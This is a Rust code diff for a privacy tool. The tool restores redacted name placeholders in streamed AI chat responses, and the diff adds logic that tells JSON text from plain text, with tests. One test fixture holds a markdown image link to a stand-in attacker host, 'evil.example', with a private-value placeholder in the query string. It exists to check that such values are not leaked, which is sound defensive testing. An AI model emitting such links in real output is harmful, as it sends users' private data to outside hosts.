@@ -158,10 +158,69 @@ impl StreamTransform for Passthrough {
 }
 
 /// Plain text, or JSON text (real values are JSON-escaped); tags inside
-/// URLs are left alone either way.
+/// URLs are left alone either way. A text that may be either is held back
+/// until its start tells ([`sniff_text`]).
 enum TextRestorer {
     Plain(Guarded<StreamRestorer>),
     Json(JsonFragRestorer),
+    Sniff(Box<Sniff>),
+}
+
+/// A text not decided yet: everything seen so far (bounded by
+/// [`SNIFF_MAX`]), of which the first `emitted` bytes went out unrestored
+/// (a forced flush).
+struct Sniff {
+    engine: Engine,
+    scope: String,
+    seen: String,
+    emitted: usize,
+}
+
+/// What a streamed text is.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum TextKind {
+    Plain,
+    Json,
+}
+
+/// Decide what a streamed text is from its start `text` (all of it when
+/// `end`), or `None` to wait. JSON text is one that reads as JSON up to a
+/// string or an object (`{"`, `["`, `[{`, and then however it goes on), or
+/// a value followed by another on a later line; a text that stops being
+/// JSON before that (`[NAME_1]`, `[1] see`, `{ is`) is plain. Only the
+/// first [`SNIFF_MAX`] bytes are read, so the answer never depends on how
+/// the text was split.
+fn sniff_text(text: &str, end: bool) -> Option<TextKind> {
+    let t = text.trim_start_matches('\u{feff}').trim_start();
+    if !t.starts_with(['{', '[']) {
+        return (end || !t.is_empty()).then_some(TextKind::Plain);
+    }
+    let mut cut = t.len().min(SNIFF_MAX);
+    while !t.is_char_boundary(cut) {
+        cut -= 1;
+    }
+    let head = &t[..cut];
+    let decided = match json_start(head) {
+        JsonStart::Clear | JsonStart::Broken => Some(TextKind::Json),
+        JsonStart::Not => Some(TextKind::Plain),
+        JsonStart::Open => None,
+        // A whole value that held a string or an object is JSON.
+        JsonStart::Closed(_, true) => Some(TextKind::Json),
+        JsonStart::Closed(at, false) => match after_value(&head[at..]) {
+            Some(PlainKind::Json) => Some(TextKind::Json),
+            Some(_) => Some(TextKind::Plain),
+            None => None,
+        },
+    };
+    decided.or(if t.len() > SNIFF_MAX {
+        // Still JSON so far, and long: JSON.
+        Some(TextKind::Json)
+    } else if end {
+        // Brackets, numbers and literals only: nothing to restore either way.
+        Some(TextKind::Plain)
+    } else {
+        None
+    })
 }
 
 impl TextRestorer {
@@ -176,17 +235,69 @@ impl TextRestorer {
         })))
     }
 
+    /// Plain or JSON text, as its start tells.
+    fn sniffing(engine: &Engine, scope: &str) -> Self {
+        TextRestorer::Sniff(Box::new(Sniff {
+            engine: engine.clone(),
+            scope: scope.to_string(),
+            seen: String::new(),
+            emitted: 0,
+        }))
+    }
+
     fn push(&mut self, text: &str) -> String {
         match self {
             TextRestorer::Plain(r) => r.push(text),
             TextRestorer::Json(r) => r.push(text),
+            TextRestorer::Sniff(s) => {
+                s.seen.push_str(text);
+                match sniff_text(&s.seen, false) {
+                    Some(kind) => self.decide(kind),
+                    None => String::new(),
+                }
+            }
         }
+    }
+
+    /// Leave sniffing as `kind`: the text that went out unrestored is the
+    /// new restorer's context, the rest is restored.
+    fn decide(&mut self, kind: TextKind) -> String {
+        let TextRestorer::Sniff(s) = self else {
+            return String::new();
+        };
+        let mut r = match kind {
+            TextKind::Plain => TextRestorer::plain(&s.engine, &s.scope),
+            TextKind::Json => TextRestorer::json(&s.engine, &s.scope),
+        };
+        let (done, rest) = s.seen.split_at(s.emitted);
+        match &mut r {
+            TextRestorer::Plain(p) => p.skip(done),
+            TextRestorer::Json(j) => {
+                let _ = j.push(done);
+            }
+            TextRestorer::Sniff(_) => {}
+        }
+        let out = r.push(rest);
+        *self = r;
+        out
     }
 
     fn finish(&mut self) -> String {
         match self {
             TextRestorer::Plain(r) => r.finish(),
             TextRestorer::Json(r) => r.finish(),
+            TextRestorer::Sniff(s) => {
+                if let Some(kind) = sniff_text(&s.seen, false) {
+                    let mut out = self.decide(kind);
+                    out.push_str(&self.finish());
+                    return out;
+                }
+                // Still undecided (brackets and numbers so far): it goes out
+                // as it came, and the text goes on being sniffed.
+                let out = s.seen[s.emitted..].to_string();
+                s.emitted = s.seen.len();
+                out
+            }
         }
     }
 
@@ -194,6 +305,7 @@ impl TextRestorer {
         match self {
             TextRestorer::Plain(r) => r.pending_len(),
             TextRestorer::Json(r) => r.pending_len(),
+            TextRestorer::Sniff(s) => s.seen.len() - s.emitted,
         }
     }
 }
@@ -310,7 +422,7 @@ fn sniff_plain(buf: &[u8], end: bool) -> Option<PlainKind> {
             JsonStart::Clear | JsonStart::Broken => Some(PlainKind::Json),
             JsonStart::Open => more(t),
             JsonStart::Not => Some(PlainKind::Text),
-            JsonStart::Closed(at) => after_value(&t[at..]).or_else(|| more(t)),
+            JsonStart::Closed(at, _) => after_value(&t[at..]).or_else(|| more(t)),
         },
         Some('"') => match string_end(t) {
             Some(at) => after_value(&t[at..]).or_else(|| more(t)),
@@ -1159,8 +1271,11 @@ fn render_path(path: &[Seg]) -> String {
 /// How a key's successive values relate.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum Kind {
-    /// Known deltas (chatgpt.com appends, Claude text deltas).
+    /// Known deltas of text (Claude text deltas, non-JSON SSE data).
     Delta,
+    /// Known deltas under a chatgpt.com patch path: text or JSON text (a
+    /// tool call, a canvas document), as its start tells.
+    Patch,
     /// Known deltas of JSON text (tool-call `partial_json`).
     JsonDelta,
     /// Unknown: a value that extends the previous one is a snapshot of the
@@ -1243,7 +1358,8 @@ enum JsonStart {
     /// An unfinished object or array, nothing telling yet (`[`, `[1, 2`).
     Open,
     /// A complete object or array ending at this byte offset (`[1]`).
-    Closed(usize),
+    /// The flag: whether it reached a string or an object.
+    Closed(usize, bool),
     /// Not JSON (`[NAME_1]`, `[1] see`, prose).
     Not,
     /// Clearly JSON, then not valid (`["a", ]`, `{"v": NaN}`).
@@ -1366,7 +1482,7 @@ fn json_start(text: &str) -> JsonStart {
             _ => return invalid(clear),
         }
         if stack.is_empty() {
-            return JsonStart::Closed(i);
+            return JsonStart::Closed(i, clear);
         }
     }
     if clear {
@@ -1374,13 +1490,6 @@ fn json_start(text: &str) -> JsonStart {
     } else {
         JsonStart::Open
     }
-}
-
-/// Is `text` the start of a JSON object or array that is not finished yet
-/// (`{"q": "x`, `[1, "a`)? Text that merely starts with a bracket
-/// (`[NAME_1] said`, `[1] see`) is not.
-fn is_json_prefix(text: &str) -> bool {
-    matches!(json_start(text), JsonStart::Clear | JsonStart::Open)
 }
 
 /// Does `text` (after a BOM and whitespace) start like a JSON object, array
@@ -1598,7 +1707,7 @@ impl Events {
             self.reset(&key, seq);
         }
         match v {
-            Value::String(s) => self.push(&key, seq, Leaf::Json(base), s, Kind::Delta),
+            Value::String(s) => self.push(&key, seq, Leaf::Json(base), s, Kind::Patch),
             Value::Object(_) | Value::Array(_) => {
                 let mut paths = Vec::new();
                 leaf_paths(v, &mut Vec::new(), &mut paths);
@@ -1608,7 +1717,7 @@ impl Events {
                     let mut full = base.clone();
                     full.extend(rel.iter().cloned());
                     if let Some(Value::String(s)) = pointer_mut(v, &rel) {
-                        changed |= self.push(&k, seq, Leaf::Json(full), s, Kind::Delta);
+                        changed |= self.push(&k, seq, Leaf::Json(full), s, Kind::Patch);
                     }
                 }
                 changed
@@ -1646,15 +1755,15 @@ impl Events {
             tracks,
             ..
         } = self;
-        // JSON text arriving in pieces under a key parda does not know is
-        // restored with JSON escaping, never as plain text.
-        let json_text =
-            kind == Kind::JsonDelta || (kind == Kind::Auto && is_json_prefix(s.trim_start()));
+        let fresh = !tracks.contains_key(key);
+        // JSON text arriving in pieces is restored with JSON escaping, never
+        // as plain text; under a key parda does not know (or a patch path)
+        // the text's start tells which it is.
         let track = tracks.entry(key.to_string()).or_insert_with(|| Track {
-            restorer: if json_text {
-                TextRestorer::json(engine, scope)
-            } else {
-                TextRestorer::plain(engine, scope)
+            restorer: match kind {
+                Kind::JsonDelta => TextRestorer::json(engine, scope),
+                Kind::Delta => TextRestorer::plain(engine, scope),
+                Kind::Patch | Kind::Auto => TextRestorer::sniffing(engine, scope),
             },
             kind,
             prev_raw: String::new(),
@@ -1662,9 +1771,15 @@ impl Events {
             recent: String::new(),
             last: None,
         });
-        if track.kind == Kind::Auto && json_container(s).is_some() {
+        let whole_json = matches!(track.kind, Kind::Auto) || (track.kind == Kind::Patch && fresh);
+        if whole_json && json_container(s).is_some() {
             // A JSON document in a string, sent whole: restored at its own
-            // level, never spliced into as text.
+            // level, never spliced into as text. A patch path's appends that
+            // follow go on as JSON text.
+            if track.kind == Kind::Patch {
+                track.restorer = TextRestorer::json(engine, scope);
+                let _ = track.restorer.push(s);
+            }
             return restore_string(engine, scope, s, 0);
         }
         let snapshot = track.kind == Kind::Auto
@@ -2061,6 +2176,133 @@ mod tests {
             .collect();
         assert_eq!(text, "Dear Ravi Kumar, ok");
         assert!(out.ends_with("{\"result\": {\"done\": true}}"));
+    }
+
+    /// An OpenAI-compatible answer (deltas under a key parda does not know).
+    fn openai_stream(deltas: &[&str]) -> Vec<u8> {
+        let mut evs: Vec<(Option<&str>, String)> = deltas
+            .iter()
+            .map(|d| {
+                (
+                    None,
+                    json!({"id": "c1", "object": "chat.completion.chunk",
+                           "choices": [{"index": 0, "delta": {"content": d}}]})
+                    .to_string(),
+                )
+            })
+            .collect();
+        evs.push((None, "[DONE]".to_string()));
+        sse(&evs)
+    }
+
+    fn openai_text(out: &[u8]) -> String {
+        events(out)
+            .iter()
+            .filter_map(|ev| serde_json::from_str::<Value>(&ev.data).ok())
+            .filter_map(|v| {
+                v["choices"][0]["delta"]["content"]
+                    .as_str()
+                    .map(str::to_string)
+            })
+            .collect()
+    }
+
+    /// Review finding: a track is JSON text only once what it carried is
+    /// clearly JSON (`{"`, `["`, `[{`), never because its first piece was a
+    /// lone `[`, `[1` or `{`; prose after such a start is restored as text
+    /// and its quotes and backslashes are left alone.
+    #[test]
+    fn tracks_are_json_text_only_when_they_carry_json() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        let q = quoted_tag(&e);
+        let prose = "1] Open \"C:\\Users\\me\\Documents\" then \"\\d+\" regex";
+        let cases: Vec<(Vec<String>, String)> = vec![
+            (vec!["[".into(), prose.into()], format!("[{prose}")),
+            (
+                vec![
+                    "[".into(),
+                    format!("NAME_1], your address \"{q}\" and [NAME_1]."),
+                ],
+                format!("Ravi Kumar, your address \"{QUOTED}\" and Ravi Kumar."),
+            ),
+            (
+                vec!["[1".into(), ", 2] items for [NAME_1]".into()],
+                "[1, 2] items for Ravi Kumar".into(),
+            ),
+            (
+                vec!["{".into(), " is a brace: \"C:\\x\" [NAME_1]".into()],
+                "{ is a brace: \"C:\\x\" Ravi Kumar".into(),
+            ),
+        ];
+        for (deltas, want) in &cases {
+            let refs: Vec<&str> = deltas.iter().map(String::as_str).collect();
+            let body = openai_stream(&refs);
+            for n in [1, 7, 10_000] {
+                let out = run(&e, "text/event-stream", &body, n);
+                assert_eq!(&openai_text(&out), want, "{deltas:?} {n}");
+            }
+            // NDJSON tokens (Grok-shaped) are tracked the same way.
+            let lines: String = refs
+                .iter()
+                .map(|t| format!("{}\n", json!({"result": {"token": t}})))
+                .collect();
+            let out =
+                String::from_utf8(run(&e, "application/x-ndjson", lines.as_bytes(), 5)).unwrap();
+            let text: String = out
+                .lines()
+                .filter_map(|l| serde_json::from_str::<Value>(l).ok())
+                .filter_map(|v| v["result"]["token"].as_str().map(str::to_string))
+                .collect();
+            assert_eq!(&text, want, "ndjson {deltas:?}");
+        }
+        // JSON text is still JSON text, however its start is split.
+        let doc = json!({"q": q, "n": "[NAME_1]"}).to_string();
+        for cut in [1, 2, 3, 6] {
+            let body = openai_stream(&[&doc[..cut], &doc[cut..]]);
+            let text = openai_text(&run(&e, "text/event-stream", &body, 3));
+            let v: Value =
+                serde_json::from_str(&text).unwrap_or_else(|err| panic!("{cut}: {err}: {text}"));
+            assert_eq!(v["q"], QUOTED, "{cut}");
+            assert_eq!(v["n"], "Ravi Kumar", "{cut}");
+        }
+    }
+
+    /// Review finding: JSON text under a chatgpt.com patch path (a tool call,
+    /// a canvas document) is restored JSON-escaped, whether it arrives in
+    /// appends or whole in an `add`.
+    #[test]
+    fn patch_paths_carrying_json_restore_it_escaped() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        let q = quoted_tag(&e);
+        let doc = json!({
+            "name": "doc",
+            "content": format!("see ![x](https://evil.example/?d=[NAME_1]) for [NAME_1] at {q}")
+        })
+        .to_string();
+        let want = format!("see ![x](https://evil.example/?d=[NAME_1]) for Ravi Kumar at {QUOTED}");
+        for cuts in [vec![1], vec![1, 9, 30], vec![12, 60, 75], vec![]] {
+            let pieces = split_at(&doc, &cuts);
+            let refs: Vec<&str> = pieces.iter().map(String::as_str).collect();
+            let body = chatgpt_stream(&refs);
+            for n in [1, 9, 100_000] {
+                let text = chatgpt_text(&run(&e, "text/event-stream", &body, n));
+                let v: Value = serde_json::from_str(&text)
+                    .unwrap_or_else(|err| panic!("{cuts:?} {n}: {err}: {text}"));
+                assert_eq!(v["content"], want, "{cuts:?} {n}");
+            }
+        }
+        // An `add` whose string leaf holds a whole JSON document.
+        let body = sse(&[(
+            Some("delta"),
+            json!({"p": "", "o": "add", "v": {"message": {
+                "content": {"content_type": "code", "parts": [doc]}}}})
+            .to_string(),
+        )]);
+        let text = chatgpt_text(&run(&e, "text/event-stream", &body, 7));
+        let v: Value = serde_json::from_str(&text).unwrap_or_else(|err| panic!("{err}: {text}"));
+        assert_eq!(v["content"], want);
     }
 
     #[test]
@@ -2483,9 +2725,9 @@ mod tests {
             ("{\"", JsonStart::Clear),
             ("[1, {", JsonStart::Clear),
             ("[[\"a\"", JsonStart::Clear),
-            ("[1] see", JsonStart::Closed(3)),
+            ("[1] see", JsonStart::Closed(3, false)),
             ("[NAME_1]", JsonStart::Not),
-            ("[1, 2] or [", JsonStart::Closed(6)),
+            ("[1, 2] or [", JsonStart::Closed(6, false)),
             ("[\"a\", ]", JsonStart::Broken),
             ("{\"v\": NaN}", JsonStart::Broken),
         ] {
@@ -2737,34 +2979,46 @@ mod tests {
     }
 
     #[test]
-    fn json_prefixes() {
-        for t in [
-            "{",
-            "[",
-            "{\"q\": \"[TER",
-            "{\"q\": \"a\\\"b",
-            "[1, \"a",
-            "[[{\"a\":[",
-            "[n",
-            "[tr",
-            "{\"a\": 1, \"b\"",
+    fn streamed_texts_are_json_only_once_they_clearly_are() {
+        use TextKind::{Json, Plain};
+        for (t, want) in [
+            ("{\"q\": \"[TER", Some(Json)),
+            ("{\"q\": \"a\\\"b", Some(Json)),
+            ("[1, \"a", Some(Json)),
+            ("[[{\"a\":[", Some(Json)),
+            ("{\"a\": 1, \"b\"", Some(Json)),
+            ("[\"a\", ]", Some(Json)),
+            ("{\"a\" 1", Some(Json)),
+            ("[1]\n{\"a\"", Some(Json)),
+            ("{\"a\": \"x\"}", Some(Json)),
+            ("[\"a\"] said", Some(Json)),
+            ("{", None),
+            ("[", None),
+            ("[1", None),
+            ("[1, 2", None),
+            ("[n", None),
+            ("[tr", None),
+            ("[1]", None),
+            ("  ", None),
+            ("[NAME_1] said", Some(Plain)),
+            ("[name_1]", Some(Plain)),
+            ("[1] see", Some(Plain)),
+            ("{NAME_1}", Some(Plain)),
+            ("{ is", Some(Plain)),
+            ("{\"a\": 1} more", Some(Json)),
+            ("[na", Some(Plain)),
+            ("text", Some(Plain)),
         ] {
-            assert!(is_json_prefix(t), "{t}");
+            assert_eq!(sniff_text(t, false), want, "{t}");
         }
-        for t in [
-            "[NAME_1] said",
-            "[name_1]",
-            "[1] see",
-            "[1]",
-            "{NAME_1}",
-            "{\"a\": 1} more",
-            "[na",
-            "text",
-            "",
-            "{\"a\" 1",
-        ] {
-            assert!(!is_json_prefix(t), "{t}");
-        }
+        assert_eq!(sniff_text("[", true), Some(Plain));
+        assert_eq!(sniff_text("", true), Some(Plain));
+        // Past the sniffing limit, a start that is still JSON is JSON; one
+        // that stopped being JSON within it is not, however long.
+        let long = format!("[{}", "1, ".repeat(SNIFF_MAX));
+        assert_eq!(sniff_text(&long, false), Some(Json));
+        let prose = format!("[1] {}", "a".repeat(SNIFF_MAX * 2));
+        assert_eq!(sniff_text(&prose, false), Some(Plain));
     }
 
     #[test]
@@ -3429,8 +3683,19 @@ mod tests {
             }
             let pieces = split_at(&text, &cuts);
             let refs: Vec<&str> = pieces.iter().map(String::as_str).collect();
+            // A chatgpt.com part is JSON text when its whole text starts as
+            // JSON: then it is restored as JSON text, whatever the split.
+            let part_want = match sniff_text(&text, true) {
+                Some(TextKind::Json) => {
+                    let mut r = TextRestorer::json(e, SCOPE);
+                    let mut w = r.push(&text);
+                    w.push_str(&r.finish());
+                    w
+                }
+                _ => want.clone(),
+            };
             let out = run(e, "text/event-stream", &chatgpt_stream(&refs), chunk);
-            prop_assert_eq!(chatgpt_text(&out), want.clone());
+            prop_assert_eq!(chatgpt_text(&out), part_want);
             let out = run(e, "text/event-stream", &claude_stream(&refs, true), chunk);
             prop_assert_eq!(claude_text(&out), want.clone());
             let out = run(e, "text/event-stream", &claude_stream(&refs, false), chunk);
